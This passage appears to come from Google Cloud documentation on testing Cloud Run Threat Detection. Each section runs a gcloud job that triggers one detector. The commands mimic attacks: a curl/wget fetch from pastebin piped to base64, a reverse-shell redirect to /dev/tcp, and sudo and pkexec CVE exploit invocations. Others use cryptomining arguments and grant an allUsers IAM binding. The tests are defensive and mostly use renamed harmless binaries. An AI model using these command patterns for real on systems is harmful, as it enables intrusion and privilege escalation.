          --args "-c","sleep 60; cp /bin/ls /tmp/ipfs; /tmp/ipfs; sleep 10" \
          --wait
    gcloud run jobs delete $JOB_NAME --project $PROJECT --region $REGION --quiet
    

This test procedure creates an `Impact: Detect Malicious Cmdlines` finding.

## Impact: Remove Bulk Data From Disk

To trigger an `Impact: Remove Bulk Data From Disk` finding, execute a tool like `shred`.

Create and execute the Cloud Run job:
    
    
    JOB_NAME="crtd-test-remove-bulk-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
    gcloud run jobs create $JOB_NAME \
          --project $PROJECT \
          --region $REGION \
          --image marketplace.gcr.io/google/ubuntu2404:latest \
          --command sh \
          --args "-c","sleep 60; cp /bin/ls /tmp/shred; /tmp/shred; sleep 10" \
          --wait
    gcloud run jobs delete $JOB_NAME --project $PROJECT --region $REGION --quiet
    

This test procedure creates an `Impact: Remove Bulk Data From Disk` finding.

## Impact: Suspicious cryptocurrency mining activity using the Stratum Protocol

To trigger an `Impact: Suspicious cryptocurrency mining activity using the Stratum Protocol` finding, execute a binary with arguments that resemble those used by cryptocurrency mining software communicating using the Stratum protocol.

Create and execute the Cloud Run job:
    
    
    JOB_NAME="crtd-test-stratum-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
    gcloud run jobs create $JOB_NAME \
          --project $PROJECT \
          --region $REGION \
          --image marketplace.gcr.io/google/ubuntu2404:latest \
          --command bash \
          --args "-c","sleep 60; cp /bin/ls /tmp/curl; /tmp/curl --url=stratum+tcp; sleep 10" \
          --wait
    gcloud run jobs delete $JOB_NAME --project $PROJECT --region $REGION --quiet
    

This test procedure creates an `Impact: Suspicious cryptocurrency mining activity using the Stratum Protocol` finding.

## Malicious Script Executed

To trigger a `Malicious Script Executed` finding, execute a script that mimics malicious behavior.

Create and execute the Cloud Run job:
    
    
    JOB_NAME="crtd-test-malicious-script-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
    gcloud run jobs create $JOB_NAME \
          --project $PROJECT \
          --region $REGION \
          --image marketplace.gcr.io/google/ubuntu2404:latest \
          --command sh \
          --args "-c","sleep 60; sh -c \"(curl -fsSL https://pastebin.com/raw/KGwfArMR||wget -q -O - https://pastebin.com/raw/KGwfArMR)| base64 -d\"; sleep 10" \
          --wait
    gcloud run jobs delete $JOB_NAME --project $PROJECT --region $REGION --quiet
    

This test procedure creates a `Malicious Script Executed` finding.

## Malicious URL Observed

To trigger a `Malicious URL Observed` finding, execute a binary and provide a malicious URL as an argument.

Create and execute the Cloud Run job:
    
    
    JOB_NAME="crtd-test-malicious-url-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
    gcloud run jobs create $JOB_NAME \
          --project $PROJECT \
          --region $REGION \
          --image marketplace.gcr.io/google/ubuntu2404:latest \
          --command sh \
          --args "-c","sleep 60; apt-get update && apt-get install curl -y && curl https://testsafebrowsing.appspot.com/s/malware.html | cat; sleep 10" \
          --wait
    gcloud run jobs delete $JOB_NAME --project $PROJECT --region $REGION --quiet
    

This test procedure triggers a `Malicious URL Observed` finding.

## Privilege Escalation: Abuse of Sudo For Privilege Escalation (CVE-2019-14287)

To trigger a `Privilege Escalation: Abuse of Sudo For Privilege Escalation (CVE-2019-14287)` finding, execute the `sudo` binary with the `-u#-1` parameter.

Create and execute the Cloud Run job:
    
    
    JOB_NAME="crtd-test-abuse-sudo-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
    gcloud run jobs create $JOB_NAME \
          --project $PROJECT \
          --region $REGION \
          --image marketplace.gcr.io/google/ubuntu2404:latest \
          --command sh \
          --args "-c","sleep 60; cp /bin/ls /tmp/sudo; /tmp/sudo -u#-1; sleep 10" \
          --wait
    gcloud run jobs delete $JOB_NAME --project $PROJECT --region $REGION --quiet
    

This test procedure creates a `Privilege Escalation: Abuse of Sudo For Privilege Escalation (CVE-2019-14287)` finding.

## Privilege Escalation: Sudo Potential Privilege Escalation (CVE-2021-3156)

To trigger a `Privilege Escalation: Sudo Potential Privilege Escalation (CVE-2021-3156)` finding, execute the `sudo` binary with the `-s` parameter and a parameter that ends with ``.

Create and execute the Cloud Run job:
    
    
    JOB_NAME="crtd-test-sudo-potential-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
    gcloud run jobs create $JOB_NAME \
          --project $PROJECT \
          --region $REGION \
          --image marketplace.gcr.io/google/ubuntu2404:latest \
          --command bash \
          --args "-c",'sleep 60; cp /bin/ls /tmp/sudo; su $(id -un 1000) -c "/tmp/sudo -s \"123\\\\\"" ; sleep 10' \
          --wait
    gcloud run jobs delete $JOB_NAME --project $PROJECT --region $REGION --quiet
    

This test procedure creates a `Privilege Escalation: Sudo Potential Privilege Escalation (CVE-2021-3156)` finding.

## Privilege Escalation: Polkit Local Privilege Escalation Vulnerability (CVE-2021-4034)

To trigger a `Privilege Escalation: Polkit Local Privilege Escalation Vulnerability (CVE-2021-4034)` finding, execute a `pkexec` binary with the `GCONV_PATH` environment variable set as a non-root user.

Create and execute the Cloud Run job:
    
    
    JOB_NAME="crtd-test-polkit-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
    gcloud run jobs create $JOB_NAME \
          --project $PROJECT \
          --region $REGION \
          --image marketplace.gcr.io/google/ubuntu2404:latest \
          --command bash \
          --args "-c",'sleep 60; cp /bin/ls /tmp/pkexec; su $(id -un 1000) -c "GCONV_PATH=junk /tmp/pkexec;"; sleep 10' \
          --wait
    gcloud run jobs delete $JOB_NAME --project $PROJECT --region $REGION --quiet
    

This test procedure creates a `Privilege Escalation: Polkit Local Privilege Escalation Vulnerability (CVE-2021-4034)` finding.

## Reverse Shell

To trigger a `Reverse Shell` finding, start a binary with `stdin` redirection to a TCP-connected socket.

Create and execute the Cloud Run job:
    
    
    JOB_NAME="crtd-test-reverse-shell-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
    gcloud run jobs create $JOB_NAME \
          --project $PROJECT \
          --region $REGION \
          --image marketplace.gcr.io/google/ubuntu2404:latest \
          --command bash \
          --args "-c","sleep 60; cp /bin/echo /tmp/sh; /tmp/sh >& /dev/tcp/8.8.8.8/53 0>&1; sleep 10" \
          --wait
    gcloud run jobs delete $JOB_NAME --project $PROJECT --region $REGION --quiet
    

This test procedure creates a `Reverse Shell` finding.

## Unexpected Child Shell

To test the `Unexpected Child Shell` detector, create a process tree that includes a child shell process.

Create and execute the Cloud Run job:
    
    
    JOB_NAME="crtd-test-unexpected-child-shell-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
    gcloud run jobs create $JOB_NAME \
          --project $PROJECT \
          --region $REGION \
          --image marketplace.gcr.io/google/ubuntu2404:latest \
          --command sh \
          --task-timeout 700 \
          --args "-c",'sleep 601; cp /bin/sh /tmp/consul; cp /bin/echo /tmp/sh; /tmp/consul -c "/tmp/sh child ran successfully & wait"; sleep 10' \
          --wait
    gcloud run jobs delete $JOB_NAME --project $PROJECT --region $REGION --quiet
    

This test procedure creates an `Unexpected Child Shell` finding. Note that this test can take up to 15 minutes to produce a finding.

## Execution: Cryptomining Docker Image

To trigger an `Execution: Cryptomining Docker Image` finding, deploy a container using a Docker image name associated with cryptomining software.

Create and execute the Cloud Run job:
    
    
    JOB_NAME="crtd-test-mining-img-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
    gcloud run jobs create $JOB_NAME \
          --project $PROJECT \
          --region $REGION \
          --image docker.io/security-test-DO-NOT-USE/xmrig:latest \
          --command sh \
          --wait || true
    gcloud run jobs delete $JOB_NAME --project $PROJECT --region $REGION --quiet
    

This test procedure creates an `Execution: Cryptomining Docker Image` finding. Note that the job deployment will fail because the image does not exist, but the finding will still be generated.

## Impact: Cryptomining Commands

To trigger an `Impact: Cryptomining Commands` finding, execute a command with arguments that resemble known cryptomining software.

Create and execute the Cloud Run job:
    
    
    JOB_NAME="crtd-test-mining-cmd-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
    gcloud run jobs create $JOB_NAME \
          --project $PROJECT \
          --region $REGION \
          --image marketplace.gcr.io/google/ubuntu2404:latest \
          --command xmrig \
          --wait || true
    gcloud run jobs delete $JOB_NAME --project $PROJECT --region $REGION --quiet
    

This test procedure creates an `Impact: Cryptomining Commands` finding. Note that the job execution will fail because the command does not exist in the image, but the finding will still be generated.

## Privilege Escalation: Default Compute Engine Service Account SetIAMPolicy

To trigger a `Privilege Escalation: Default Compute Engine Service Account SetIAMPolicy` finding, execute a command that uses the default Compute Engine service account to set the IAM policy of a Cloud Run service.

Create and execute the Cloud Run job:
    
    
    JOB_NAME="crtd-test-set-iam-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
    gcloud run jobs create $JOB_NAME \
          --project $PROJECT \
          --region $REGION \
          --image gcr.io/google.com/cloudsdktool/google-cloud-cli:stable \
          --command gcloud \
          --args "run","services","add-iam-policy-binding","non-existent-service","--region",$REGION,"--member=allUsers","--role=roles/run.invoker","--quiet" \
          --wait
    gcloud run jobs delete $JOB_NAME --project $PROJECT --region $REGION --quiet
    

This test procedure creates a `Privilege Escalation: Default Compute Engine Service Account SetIAMPolicy` finding.

## What's next

  * Learn more about [Cloud Run Threat Detection](https://docs.cloud.google.com/security-command-center/docs/cloud-run-threat-detection-overview).
  * Learn how to [use Cloud Run Threat Detection](https://docs.cloud.google.com/security-command-center/docs/use-cloud-run-threat-detection).



Send feedback 

Except as otherwise noted, the content of this page is licensed under the [Creative Commons Attribution 4.0 License](https://creativecommons.org/licenses/by/4.0/), and code samples are licensed under the [Apache 2.0 License](https://www.apache.org/licenses/LICENSE-2.0). For details, see the [Google Developers Site Policies](https://developers.google.com/site-policies). Java is a registered trademark of Oracle and/or its affiliates.

Last updated 2026-10-22 UTC.

Need to tell us more?  [[["Easy to understand","easyToUnderstand","thumb-up"],["Solved my problem","solvedMyProblem","thumb-up"],["Other","otherUp","thumb-up"]],[["Hard to understand","hardToUnderstand","thumb-down"],["Incorrect information or sample code","incorrectInformationOrSampleCode","thumb-down"],["Missing the information/samples I need","missingTheInformationSamplesINeed","thumb-down"],["Other","otherDown","thumb-down"]],["Last updated 2026-10-22 UTC."],[],[]] 
